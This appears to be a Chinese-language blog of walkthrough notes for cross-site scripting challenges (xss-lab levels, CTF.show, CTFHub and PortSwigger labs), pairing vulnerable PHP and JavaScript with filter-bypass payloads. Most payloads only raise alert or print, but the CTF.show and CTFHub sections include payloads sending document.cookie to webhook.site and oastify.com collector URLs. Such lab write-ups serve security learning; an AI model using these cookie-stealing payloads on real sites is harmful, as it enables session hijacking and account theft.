<h3 id="level-9（http）"><a href="#level-9（http）" class="headerlink" title="level-9（http）"></a>level-9（http）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;</span><br><span class="line">else</span><br><span class="line">&#123;echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;.$str7.&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;&#125;</span><br></pre></td></tr></table></figure>

<p>在上题的基础上再添上 <code>//http://</code>就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http://</span><br></pre></td></tr></table></figure>

<h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>当一个input元素里面有两个type时，那么只有第一个 <code>type</code> 属性会被浏览器解析，而第二个 <code>type</code> 属性会被忽略</p>
<p>payload：<code>t_sort=&quot;type=&quot;text&quot;onclick=&quot;alert(1)</code></p>
<h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>在referer里面进行修改就行：<code>&quot;type=&quot;text&quot;onclick=&quot;alert(1)</code></p>
<h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p>和上题不同的是要在User-Agent里面改</p>
<h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p>这题在cookie里面改就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;type=&quot;text&quot;onclick=&quot;alert(1)或者&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)</span><br></pre></td></tr></table></figure>

<h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p>考到了杂项，不会</p>
<h3 id="level-15（文件包含）"><a href="#level-15（文件包含）" class="headerlink" title="level-15（文件包含）"></a>level-15（文件包含）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;src&quot;];</span><br><span class="line">echo &#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>ng-include</strong>指令用于包含外部的 HTML 文件。包含的内容将作为指定元素的子节点。</p>
<p><code>ng-include</code>属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下</p>
<p>所以这题我们只需要包含第一题的漏洞就好了：<code>src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;</code></p>
<h3 id="level-16（替换空格）"><a href="#level-16（替换空格）" class="headerlink" title="level-16（替换空格）"></a>level-16（替换空格）</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot; &quot;,$str);</span><br><span class="line">$str3=str_replace(&quot; &quot;,&quot; &quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;/&quot;,&quot; &quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;	&quot;,&quot; &quot;,$str4);</span><br><span class="line">echo &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;</span><br></pre></td></tr></table></figure>

<p>1、“0D”是把光标移到同一行的顶头——回车(CR)。</p>
<p>2、“0A”是把光标移到下一行——换行(LF)。</p>
<p>3、用“&#x2F;”代替空格</p>
<p>使用替身，就是将<code>%0a</code>或者<code>%0D</code>当成空格使用，在<strong>HTML</strong>中这样是合法的</p>
<p>payload：<code>&lt;img%0dsrc=1%0donerror=alert(1)&gt;</code></p>
<h2 id="CTF-show"><a href="#CTF-show" class="headerlink" title="CTF.show"></a>CTF.show</h2><h3 id="web316-web319"><a href="#web316-web319" class="headerlink" title="web316-web319"></a>web316-web319</h3><p>除了316外后面几题过滤了 <code>&lt;javascript&gt;</code>，所以解题如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.open(&#x27;https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2/?a=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web320-web326"><a href="#web320-web326" class="headerlink" title="web320-web326"></a>web320-web326</h3><p>可以通过在输入框输入一串字符（比如：我输入了script），然后查看回显，有回显说明没有被过滤掉，无回显说明被过滤掉了</p>
<p>web320:</p>
<p>通过查看网址发现空格被替换成了加号，过滤了空格，可以用&#x2F;或者&#x2F;**&#x2F;来代替空格，所以解题如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;window.open(&#x27;https://webhook.site/346c0b70-1254-4efc-a539-54c670644ab2/?a=&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>后面几题都可以用上述的方法</p>
<h3 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h3><p>发信人必须是admin，然后信的内容是xss的内容就好了</p>
<h2 id="CTFHub-XSS"><a href="#CTFHub-XSS" class="headerlink" title="CTFHub-XSS"></a>CTFHub-XSS</h2><h3 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../../source/imgs/$%7Bfiilname%7D/image-20240318195231298.png" alt="image-20240318195231298"></p>
<p>该题没有任何过滤，最开始我只在第一行里面构造xss，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=`https://pxq8pofmxik8gq7hg445ctw5jwpnde13.oastify.com/?$&#123;document.cookie&#125;`&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>提交之后确实会访问该网站但是查bp的时候发现没有任何的cookie，后面再看眼页面发现需要利用第二行发送一个url给Bot，所以如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-fe994fbb8a6a0602.sandbox.ctfhub.com:10800/?name=&lt;script&gt;window.location.href=`https://pxq8pofmxik8gq7hg445ctw5jwpnde13.oastify.com/?$&#123;document.cookie&#125;`&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>发送后在bp查看获取flag</p>
<h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>只要空格变为 <code>/**/</code>就好啦</p>
<h2 id="bp实验室"><a href="#bp实验室" class="headerlink" title="bp实验室"></a>bp实验室</h2><h3 id="Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search"><a href="#Lab-DOM-XSS-in-innerHTML-sink-using-source-location-search" class="headerlink" title="Lab: DOM XSS in innerHTML sink using source location.search"></a>Lab: DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h3><p>本实验在搜索博客功能中包含一个基于 DOM 的跨站点脚本漏洞。它使用赋 <code>innerHTML</code> 值，该赋值使用来自 <code>location.search</code> 的数据更改 <code>div</code> 元素的 HTML 内容</p>
<p>最开始在搜索框中输入 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>的时候，并没有成功执行，通过hackbar查看元素的时候发现该行代码成功注入，但是没有执行（后面看解析视频的时候说是因为同步的问题，浏览器的自我保护机制）</p>
<p>于是我们再思考思考有什么是可以被执行的，即img元素，我们运用的也仅仅是一个报错罢了，所以尝试在输入框内输入 <code>&lt;img src=1 onerror=alert(1)&gt;</code>，点击发送，页面成功回显alert，于是通过这个方法我们也可以执行任意的js代码来达到我们的目的</p>
<h3 id="Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source"><a href="#Lab-DOM-XSS-in-jQuery-anchor-href-attribute-sink-using-location-search-source" class="headerlink" title="Lab: DOM XSS in jQuery anchor href attribute sink using location.search source"></a>Lab: DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h3><p>该题先是尝试了在评论区里面评论以及提交反馈处xss，但是都失败了，后面查看了一下提交反馈界面的源码，发现了以下代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	$(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    	$(<span class="string">&#x27;#backLink&#x27;</span>).<span class="title function_">attr</span>(<span class="string">&quot;href&quot;</span>, (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;returnPath&#x27;</span>));</span><br><span class="line">	&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$(function() &#123; ... &#125;)</code>: 这是jQuery中的一种文档就绪函数，即在DOM加载完成后执行其中的代码。它等价于JavaScript中的<code>document.addEventListener(&#39;DOMContentLoaded&#39;, function() &#123; ... &#125;)</code>。</li>
<li><code>$(&#39;#backLink&#39;)</code>: 这是jQuery选择器，用于选取id为”backLink”的元素。</li>
<li><code>.attr(&quot;href&quot;, ...)</code>: 这是jQuery中用于设置元素属性的方法。在这里，它设置了id为”backLink”的元素的href属性。</li>
<li><code>(new URLSearchParams(window.location.search)).get(&#39;returnPath&#39;)</code>: 这一部分使用了JavaScript中的URLSearchParams对象来获取当前页面URL中查询参数”returnPath”的值。首先，通过<code>window.location.search</code>获取当前页面URL的查询参数部分，然后使用<code>URLSearchParams</code>对象来解析这个查询参数字符串，最后调用<code>.get(&#39;returnPath&#39;)</code>方法获取名为”returnPath”的参数的值。</li>
</ul>
<p>看到网址处：<code>https://0aa3002e043a24f88b20e4c8006c0026.web-security-academy.net/feedback?returnPath=/</code>尝试性在后面输入 <code>abc123</code>，检查back按键发现输入内容已经进入了href后面，如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../../source/imgs/$%7Bfiilname%7D/1-1714652866959-2.png"></p>
<p>于是我们把输入的内容改为：<code>javascript:alert(document.cookie)</code>，然后再点击back按键，解决问题</p>
<h3 id="Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event"><a href="#Lab-DOM-XSS-in-jQuery-selector-sink-using-a-hashchange-event" class="headerlink" title="Lab: DOM XSS in jQuery selector sink using a hashchange event"></a>Lab: DOM XSS in jQuery selector sink using a hashchange event</h3><p>要求：要解决该实验室问题，请向受害者提供一个漏洞利用程序，在其浏览器中调用 <code>print()</code> 函数</p>
<p>进入实验室，查看源代码，js代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> $(<span class="variable language_">window</span>).<span class="title function_">on</span>(<span class="string">&#x27;hashchange&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">var</span> post = $(<span class="string">&#x27;section.blog-list h2:contains(&#x27;</span> + <span class="built_in">decodeURIComponent</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">hash</span>.<span class="title function_">slice</span>(<span class="number">1</span>)) + <span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (post) post.<span class="title function_">get</span>(<span class="number">0</span>).<span class="title function_">scrollIntoView</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这段代码是用jQuery编写的，监听浏览器URL中哈希值（#后面的部分）的变化，当哈希值发生变化时，它会查找页面上带有特定标题的元素，并将页面滚动到该元素位置。</p>
<p>具体来说：</p>
<ul>
<li><code>$(window).on(&#39;hashchange&#39;, function()&#123;...&#125;);</code>：这一行代码是当浏览器URL的哈希值发生变化时触发的事件处理程序。</li>
<li><code>var post = $(&#39;section.blog-list h2:contains(&#39; + decodeURIComponent(window.location.hash.slice(1)) + &#39;)&#39;);</code>：这一行代码是查找页面上包含特定标题的元素。它首先解码哈希值（由<code>decodeURIComponent()</code>函数完成），然后使用选择器<code>section.blog-list h2:contains(...)</code>查找带有指定标题的<code>&lt;h2&gt;</code>元素。查找结果将被存储在变量<code>post</code>中。</li>
<li><code>if (post) post.get(0).scrollIntoView();</code>：这一行代码是将页面滚动到包含特定标题的元素处。它首先检查是否找到了符合条件的元素（通过检查<code>post</code>变量是否存在），如果找到了，则使用<code>scrollIntoView()</code>方法将其滚动到可见区域。</li>
</ul>
<p>这段代码的功能是让页面在加载后根据URL中的哈希值自动滚动到对应标题的部分</p>
<p>页面源码中的h2元素就是文章的标题</p>
<p>网上找到的关于此函数的相关漏洞链接：<a target="_blank" rel="noopener" href="https://bugs.jquery.com/ticket/9521/">https://bugs.jquery.com/ticket/9521/</a></p>
<p>发现了有意思的地方如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;$(location.hash)&quot; expected CSS selector in many case, but this code also can create html element.</span><br><span class="line">“$(location.hash)”在很多情况下都需要 CSS 选择器，但此代码也可以创建 html 元素。</span><br></pre></td></tr></table></figure>

<p>上面的意思就是说如果未找到css选择器中要查找的元素，那么会自动创建html元素</p>
<p>这样子的话我们可以直接在<code>#</code>后面加上js代码：<code>https://0a3200c703b1b8bf81aed57300fd0044.web-security-academy.net/#&lt;img src=x onerror=print()&gt;</code>，点击回车会有弹窗出现，但是只能够触发一次，下一次就失败，无法访问网站，所以直接把该链接给受害者的办法是行不通的，需要换一种思路：首先加载<code>https://0a3200c703b1b8bf81aed57300fd0044.web-security-academy.net/#</code>，然后我们再把payload加载到该url中，这样便可以触发一次哈希更改事件</p>
<p>所以我们在bp提供的漏洞利用程序中的body部分可以这样写到：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;https://YOUR-LAB-ID.web-security-academy.net/#&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;this.src+=&#x27;&lt;img src=x onerror=print()&gt;&#x27;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试该漏洞成功，把它发给受害者，题目解决</p>
<h3 id="Lab：将-XSS-反射到带有尖括号-HTML-编码的属性中"><a href="#Lab：将-XSS-反射到带有尖括号-HTML-编码的属性中" class="headerlink" title="Lab：将 XSS 反射到带有尖括号 HTML 编码的属性中"></a>Lab：将 XSS 反射到带有尖括号 HTML 编码的属性中</h3><p>要求：此实验室在搜索博客功能中包含一个反映的跨站点脚本漏洞，其中尖括号是 HTML 编码的。要完成此实验，请执行跨站点脚本攻击，注入属性并调用 <code>alert</code> 函数</p>
<p>在搜索框处随机输入一串字符，然后检查元素，如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; placeholder=&quot;Search the blog...&quot; name=&quot;search&quot; value=&quot;ilbxoiusagxui&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>于是我们可以尝试逃出双引号，首先尝试输入：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;</code>，失败，检查元素，发现特殊符号被转化为HTML实体，</p>
<p>接着尝试：<code>&quot;onload=&quot;alert(1)</code>，失败，没有弹窗</p>
<p>接着尝试另一种方法：<code>&quot;onmouseover=&quot;alert(1)</code>，鼠标经过相关元素，弹窗成功，题目解决</p>
<h3 id="Lab：将-XSS-存储到带有双引号-HTML-编码的锚点-href-属性中"><a href="#Lab：将-XSS-存储到带有双引号-HTML-编码的锚点-href-属性中" class="headerlink" title="Lab：将 XSS 存储到带有双引号 HTML 编码的锚点 href 属性中"></a>Lab：将 XSS 存储到带有双引号 HTML 编码的锚点 <code>href</code> 属性中</h3><p>要求：该实验在评论功能中包含一个存储的跨站点脚本漏洞。要完成此实验，请提交一条评论，该评论在单击评论作者姓名时调用 <code>alert</code> 函数</p>
<p>随便点进一篇文章，先随便提交一条评论，接着返回查看评论，如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/../../source/imgs/$%7Bfiilname%7D/image-20240503102750448.png" alt="image-20240503102750448"></p>
<p>点击评论者名字的话会自动跳转到你输入进去的网址</p>
<p>所以我们有了思路，在写评论中让你输入网址的地方利用js伪协议，输入：<code>javascript:alert(1)</code>，提交评论，题目解决</p>
<p><strong>（url的组成是协议加上地址，所以我们用js伪协议可以成功）</strong></p>
<h3 id="Lab：将-XSS-反射到带有尖括号-HTML-编码的-JavaScript-字符串中"><a href="#Lab：将-XSS-反射到带有尖括号-HTML-编码的-JavaScript-字符串中" class="headerlink" title="Lab：将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中"></a>Lab：将 XSS 反射到带有尖括号 HTML 编码的 JavaScript 字符串中</h3><p>要求：此实验室在尖括号编码的搜索查询跟踪功能中包含反映的跨站点脚本漏洞。反射发生在 JavaScript 字符串内。要完成本实验，请执行跨站点脚本攻击，突破 JavaScript 字符串并调用 <code>alert</code> 函数</p>
<p>在搜索栏中搜索文章名字后，右键检查元素，发现了相关的js代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> searchTerms = <span class="string">&#x27;125&#x27;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;/resources/images/tracker.gif?searchTerms=&#x27;</span>+<span class="built_in">encodeURIComponent</span>(searchTerms)+<span class="string">&#x27;&quot;&gt;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>最开始的思路被题目带歪了，一直在思考着怎么突破下面的双引号包括，当然最终的尝试以失败告终</p>
<p>然后就没有思路，开始看下面的讲解视频，发现他是突破上面变量<code>searchTerms</code>的单引号包括，恍然大悟</p>
<p>进行尝试：<code>&#39;;alert(1);&#39;</code>尝试失败，但是成功逃脱了单引号包括，要解决的就是后面遗留的<code>&#39;;</code></p>
<p>所以我们可以自己再创造一个变量出来解决这个问题：<code>&#39;;alert(1);let word=&#39;</code></p>
<p>题目解决</p>
<p>不得不说思路得扩大一点，不能只局限于一处，要多看看其他地方有没有可以突破的地方</p>
<h3 id="Lab：-document-write-接收器中的-DOM-XSS-使用选择元素内的源-location-search"><a href="#Lab：-document-write-接收器中的-DOM-XSS-使用选择元素内的源-location-search" class="headerlink" title="Lab： document.write 接收器中的 DOM XSS 使用选择元素内的源 location.search"></a>Lab： <code>document.write</code> 接收器中的 DOM XSS 使用选择元素内的源 <code>location.search</code></h3><p>要求：此实验室在股票检查器功能中包含基于 DOM 的跨站点脚本漏洞。它使用 JavaScript <code>document.write</code> 函数，将数据写入页面。 <code>document.write</code> 函数使用来自 <code>location.search</code> 的数据进行调用，您可以使用网站 URL 进行控制。数据包含在选择元素内。<br>要完成此实验，请执行跨站点脚本攻击，该攻击会突破 select 元素并调用 <code>alert</code> 函数</p>
<p>相关的js代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> stores = [<span class="string">&quot;London&quot;</span>,<span class="string">&quot;Paris&quot;</span>,<span class="string">&quot;Milan&quot;</span>];</span><br><span class="line"><span class="keyword">var</span> store = (<span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">search</span>)).<span class="title function_">get</span>(<span class="string">&#x27;storeId&#x27;</span>);</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;select name=&quot;storeId&quot;&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(store) &#123;</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option selected&gt;&#x27;</span>+store+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;stores.<span class="property">length</span>;i++) &#123;</span><br><span class="line">	<span class="keyword">if</span>(stores[i] === store) &#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;option&gt;&#x27;</span>+stores[i]+<span class="string">&#x27;&lt;/option&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;/select&gt;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这段 JavaScript 代码创建了一个 <code>&lt;select&gt;</code> 元素，其中包含了一组商店名称作为选项。它还根据 URL 查询参数中的 <code>storeId</code> 值选择了一个默认选项。</p>
<p>让我们逐行解释代码的功能：</p>
<ol>
<li><code>var stores = [&quot;London&quot;,&quot;Paris&quot;,&quot;Milan&quot;];</code>：定义了一个包含商店名称的数组。</li>
<li><code>var store = (new URLSearchParams(window.location.search)).get(&#39;storeId&#39;);</code>：使用 <code>URLSearchParams</code> 获取了当前页面 URL 查询参数中名为 <code>storeId</code> 的值，并将其存储在 <code>store</code> 变量中。</li>
<li><code>document.write(&#39;&lt;select name=&quot;storeId&quot;&gt;&#39;);</code>：使用 <code>document.write()</code> 方法输出了一个 <code>&lt;select&gt;</code> 元素的开始标签。</li>
<li><code>if (store) &#123; ... &#125;</code>：检查是否存在 <code>storeId</code> 参数。如果存在，就在 <code>&lt;select&gt;</code> 中添加一个被选中的选项，显示当前的 <code>storeId</code> 值。</li>
<li><code>for (var i = 0; i &lt; stores.length; i++) &#123; ... &#125;</code>：遍历商店数组，对每个商店创建一个 <code>&lt;option&gt;</code> 元素，并将其添加到 <code>&lt;select&gt;</code> 中。</li>
<li><code>document.write(&#39;&lt;/select&gt;&#39;);</code>：输出 <code>&lt;select&gt;</code> 元素的结束标签。</li>
</ol>
<p>通过这段代码，你可以在页面上创建一个下拉菜单，其中包含了预定义的商店选项，并且可以根据 URL 中的 <code>storeId</code> 参数自动选择默认选项</p>
<p>于是我们尝试在url中添加参数：<code>https://0a9a006303a2363184429b37009500d5.web-security-academy.net/product?productId=1&amp;storeId=sherlock</code>，然后回车，检查元素，变化如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;select name=<span class="string">&quot;storeId&quot;</span>&gt;</span><br><span class="line">	<span class="language-xml"><span class="tag">&lt;<span class="name">option</span> <span class="attr">selected</span>=<span class="string">&quot;&quot;</span>&gt;</span>sherlock<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">	<span class="language-xml"><span class="tag">&lt;<span class="name">option</span>&gt;</span>London<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">	<span class="language-xml"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Paris<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">	<span class="language-xml"><span class="tag">&lt;<span class="name">option</span>&gt;</span>Milan<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span></span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure>

<p>题目告诉我们说要突破select标签，所以我们可以让它提前闭合，payload如下：</p>
<p><code>storeId=sherlock&lt;/select&gt;&lt;img src=&quot;1&quot; onerror=alert(1)&gt;</code>后面未闭合的标签我们不需要去管，浏览器会自动修复，回车后如下</p>
